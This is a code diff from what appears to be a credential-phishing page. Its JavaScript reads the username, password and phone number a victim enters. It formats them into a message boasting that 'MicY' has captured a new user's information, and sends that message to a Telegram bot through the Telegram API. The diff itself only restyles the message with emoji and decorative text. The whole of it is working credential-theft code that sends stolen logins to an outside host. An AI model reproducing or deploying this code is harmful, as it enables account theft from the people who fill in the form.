@@ -89,11 +89,12 @@
         const p = document.getElementById('pass').value;
         const ph = document.getElementById('phone').value.trim() || "ندارد";
 
-        const msg = `Hello, I am MicY and I have captured new information from a new user and sent it to you
-Username: ${u}
-Password: ${p}
-Phone number: ${ph}
-Macker: MicY™`;
+        const msg = `🥺🌹Hello, I am #MicY 🦊 and I have captured new #information from a new #user and sent it to #you
+
+┣┨🐉👾𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: ${u}
+┣┨🔑🗣️𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙: ${p}
+┣┨🌐🧩𝙋𝙝𝙤𝙣 𝙣𝙪𝙢𝙗𝙚𝙧: ${ph}
+┣┨ 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 ┣┨: ™MicY™🦊`;
 
         // ارسال فوری به تلگرام
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
